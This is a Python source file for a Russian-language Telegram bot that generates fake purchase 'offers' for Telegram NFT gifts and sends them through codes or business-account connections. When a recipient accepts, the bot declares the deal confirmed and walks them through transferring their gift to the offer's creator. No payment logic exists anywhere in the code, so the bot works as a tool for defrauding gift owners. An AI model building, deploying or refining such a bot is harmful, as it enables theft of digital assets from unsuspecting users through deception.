import re
import os
import asyncio
import random
import string
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, CallbackQuery, BusinessConnection
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = 7856876217
CHANNEL = "@popapisa000"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

temp_offers = {}
offers_data = {}
offers_time = {}
business_connections = {}

class OfferState(StatesGroup):
    waiting_for_price = State()

def main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Создать оффер")],
            [KeyboardButton(text="Подписка"), KeyboardButton(text="Старт")]
        ],
        resize_keyboard=True
    )

def generate_code(length=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

async def is_subscribed(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    try:
        member = await bot.get_chat_member(CHANNEL, user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except:
        return False

def get_remaining_time(created_at):
    end_time = created_at + timedelta(hours=24)
    remaining = end_time - datetime.now()
    if remaining.total_seconds() <= 0:
        return "истекло"
    hours = int(remaining.total_seconds() // 3600)
    minutes = int((remaining.total_seconds() % 3600) // 60)
    return f"{hours}ч {minutes:02d}м"

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    if connection.is_enabled:
        business_connections[connection.user.id] = connection.id
        try:
            await bot.send_message(connection.user.id, "Режим секретаря активирован.")
        except:
            pass
    else:
        business_connections.pop(connection.user.id, None)

@dp.message(Command("start"))
@dp.message(F.text == "Старт")
async def start(message: types.Message):
    await message.answer(
        "Бот для создания офферов на подарки.\n\n"
        "Нажми «Создать оффер» или пришли ссылку.\n\n"
        "После создания оффера ты получишь код вида:\n"
        "<code>of a7k2m</code>\n\n"
        "Этот код можно отправить в любой чат.",
        reply_markup=main_kb()
    )

@dp.message(F.text == "Подписка")
async def subscription_info(message: types.Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("Ты владелец. Подписка не нужна.")
        return
    if await is_subscribed(message.from_user.id):
        await message.answer("Подписка активна.")
    else:
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Нужно подписаться на канал.", reply_markup=kb)

@dp.message(F.text == "Создать оффер")
async def create_offer_btn(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Сначала подпишись на канал.", reply_markup=kb)
        return
    await message.answer("Пришли ссылку на подарок:\n<code>https://t.me/nft/Название-123</code>")

@dp.message(Command("offer"))
async def offer_command(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Сначала подпишись.", reply_markup=kb)
        return
    try:
        parts = message.text.split()
        if len(parts) < 4:
            await message.answer("Формат: /offer ссылка цена валюта")
            return
        link = parts[1]
        price = parts[2]
        currency = parts[3].lower()
        if not re.match(r"https?://t\.me/nft/\S+", link):
            await message.answer("Неверная ссылка")
            return
        if not price.isdigit():
            await message.answer("Цена должна быть числом")
            return
        if currency not in ["stars", "gram", "ton"]:
            await message.answer("Валюта: stars, gram или ton")
            return
        await create_and_send_offer(message, link, price, currency, message.from_user)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

async def create_and_send_offer(target, link, price, currency, user):
    currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}[currency]
    gift_name = link.split("/")[-1].replace("-", " #")
    created_at = datetime.now()
    offer_id = f"{user.id}_{int(created_at.timestamp())}"
    code = generate_code()

    offers_time[offer_id] = created_at
    temp_offers[offer_id] = link
    offers_data[code] = {
        "link": link,
        "price": price,
        "currency": currency,
        "user_id": user.id,
        "user_name": user.full_name,
        "offer_id": offer_id,
        "created_at": created_at
    }

    remaining = get_remaining_time(created_at)

    text = (
        f"<a href='{link}'> </a>"
        f"<b>{user.full_name}</b> предлагает Вам\n"
        f"<b>{price} {currency_text}</b> за подарок <b>{gift_name}</b>.\n\n"
        f"Предложение действует ещё {remaining}."
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть подарок", url=link)],
        [
            InlineKeyboardButton(text="Отклонить", callback_data=f"d:{user.id}"),
            InlineKeyboardButton(text="Принять", callback_data=f"a:{user.id}:{price}:{currency}:{offer_id}")
        ]
    ])

    if isinstance(target, types.Message):
        try:
            await target.delete()
        except:
            pass
        await target.answer(text, reply_markup=keyboard, disable_web_page_preview=False)
        await target.answer(
            f"<b>Оффер создан!</b>\n\n"
            f"Код для отправки:\n<code>of {code}</code>\n\n"
            f"Скопируй и отправь этот код в нужный чат."
        )
    else:
        await target.message.answer(text, reply_markup=keyboard, disable_web_page_preview=False)
        await target.message.answer(f"<b>Оффер создан!</b>\n\nКод: <code>of {code}</code>")

@dp.message(F.text.regexp(r"https?://t\.me/nft/\S+"))
async def got_link(message: types.Message, state: FSMContext):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Сначала подпишись на канал.", reply_markup=kb)
        return
    await state.update_data(link=message.text.strip())
    await state.set_state(OfferState.waiting_for_price)
    await message.answer("Введи цену (только число):")

@dp.message(OfferState.waiting_for_price)
async def got_price(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Нужно только число:")
        return

    data = await state.get_data()
    link = data.get("link")
    price = message.text
    await state.clear()

    short_id = f"{message.from_user.id}_{int(datetime.now().timestamp())}"
    temp_offers[short_id] = link

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Stars", callback_data=f"c:stars:{price}:{short_id}"),
        InlineKeyboardButton(text="Gram", callback_data=f"c:gram:{price}:{short_id}"),
        InlineKeyboardButton(text="TON", callback_data=f"c:ton:{price}:{short_id}")
    ]])
    await message.answer("Выбери валюту:", reply_markup=kb)

@dp.callback_query(F.data.startswith("c:"))
async def got_currency(callback: CallbackQuery):
    try:
        parts = callback.data.split(":")
        currency = parts[1]
        price = parts[2]
        short_id = parts[3]
        link = temp_offers.get(short_id)
        if not link:
            await callback.answer("Данные устарели. Создай оффер заново.", show_alert=True)
            return
        await callback.answer()
        await create_and_send_offer(callback, link, price, currency, callback.from_user)
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

async def process_offer_code(message: types.Message):
    try:
        code = message.text.split()[1].lower()
        data = offers_data.get(code)

        business_id = getattr(message, "business_connection_id", None)

        if not data:
            text = "Оффер не найден или истёк. Создай новый."
            if business_id:
                await bot.send_message(chat_id=message.chat.id, text=text, business_connection_id=business_id)
            else:
                await message.answer(text)
            return

        link = data["link"]
        price = data["price"]
        currency = data["currency"]
        user_name = data["user_name"]
        user_id = data["user_id"]
        offer_id = data["offer_id"]
        created_at = data["created_at"]

        currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}[currency]
        gift_name = link.split("/")[-1].replace("-", " #")
        remaining = get_remaining_time(created_at)

        if remaining == "истекло":
            text = "Срок действия этого оффера истёк."
            if business_id:
                await bot.send_message(chat_id=message.chat.id, text=text, business_connection_id=business_id)
            else:
                await message.answer(text)
            return

        text = (
            f"<a href='{link}'> </a>"
            f"<b>{user_name}</b> предлагает Вам\n"
            f"<b>{price} {currency_text}</b> за подарок <b>{gift_name}</b>.\n\n"
            f"Предложение действует ещё {remaining}."
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Открыть подарок", url=link)],
            [
                InlineKeyboardButton(text="Отклонить", callback_data=f"d:{user_id}"),
                InlineKeyboardButton(text="Принять", callback_data=f"a:{user_id}:{price}:{currency}:{offer_id}")
            ]
        ])

        if business_id:
            await bot.send_message(
                chat_id=message.chat.id,
                text=text,
                reply_markup=keyboard,
                disable_web_page_preview=False,
                business_connection_id=business_id
            )
        else:
            await message.answer(text, reply_markup=keyboard, disable_web_page_preview=False)

    except Exception as e:
        try:
            await message.answer(f"Ошибка: {e}")
        except:
            pass

@dp.message(F.text.regexp(r"(?i)^of\s+([a-z0-9]{5})$"))
async def send_by_code(message: types.Message):
    await process_offer_code(message)

@dp.business_message(F.text.regexp(r"(?i)^of\s+([a-z0-9]{5})$"))
async def send_by_code_business(message: types.Message):
    await process_offer_code(message)

@dp.callback_query(F.data.startswith("a:"))
async def accept_offer(callback: CallbackQuery):
    try:
        parts = callback.data.split(":")
        seller_id = int(parts[1])
        price = parts[2]
        currency = parts[3]
        offer_id = parts[4]

        link = temp_offers.get(offer_id, "")
        currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}.get(currency, currency)
        gift_name = link.split("/")[-1].replace("-", " #") if link else "подарок"

        if offer_id in offers_time and get_remaining_time(offers_time[offer_id]) == "истекло":
            await callback.answer("Срок действия истёк.", show_alert=True)
            return

        # Всплывающее окно
        await callback.answer(
            "Предложение принято.\n\nТеперь передайте подарок продавцу.",
            show_alert=True
        )

        # Меняем сообщение на чистое с кнопкой передачи
        new_text = (
            f"<b>Сделка подтверждена!</b>\n\n"
            f"Подарок: <b>{gift_name}</b>\n"
            f"Цена: <b>{price} {currency_text}</b>\n\n"
            f"Нажмите кнопку ниже, чтобы передать подарок продавцу."
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Передать подарок", url=link)],
            [InlineKeyboardButton(text="Инструкция", callback_data=f"h:{price}:{currency_text}:{gift_name}")]
        ])

        await callback.message.edit_text(new_text, reply_markup=keyboard)

        # Уведомление продавцу
        try:
            await bot.send_message(
                seller_id,
                f"<b>Подарок продан!</b>\n\n"
                f"Покупатель: @{callback.from_user.username or callback.from_user.full_name}\n"
                f"Цена: <b>{price} {currency_text}</b>\n"
                f"Подарок: {gift_name}\n\n"
                f"Покупатель сейчас должен передать тебе подарок."
            )
        except:
            pass

    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@dp.callback_query(F.data.startswith("h:"))
async def how_to_transfer(callback: CallbackQuery):
    try:
        parts = callback.data.split(":")
        price = parts[1]
        currency_text = parts[2]
        gift_name = parts[3] if len(parts) > 3 else "подарок"

        text = (
            f"<b>Как передать подарок:</b>\n\n"
            f"1. Нажмите кнопку «Передать подарок»\n"
            f"2. Или откройте Профиль → Подарки\n"
            f"3. Выберите <b>{gift_name}</b>\n"
            f"4. Нажмите «Передать» и укажите продавца\n\n"
            f"После передачи продавец получит подарок."
        )
        await callback.message.edit_text(text)
        await callback.answer()
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@dp.callback_query(F.data.startswith("d:"))
async def decline_offer(callback: CallbackQuery):
    seller_id = int(callback.data.split(":")[1])

    await callback.answer("Вы отклонили предложение", show_alert=True)

    # Полностью убираем сообщение с оффером
    try:
        await callback.message.delete()
    except:
        try:
            await callback.message.edit_text("<b>Предложение отклонено</b>")
        except:
            pass

    # Уведомление продавцу
    try:
        await bot.send_message(
            seller_id,
            f"Покупатель отклонил твоё предложение.\n"
            f"Пользователь: @{callback.from_user.username or callback.from_user.full_name}"
        )
    except:
        pass

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
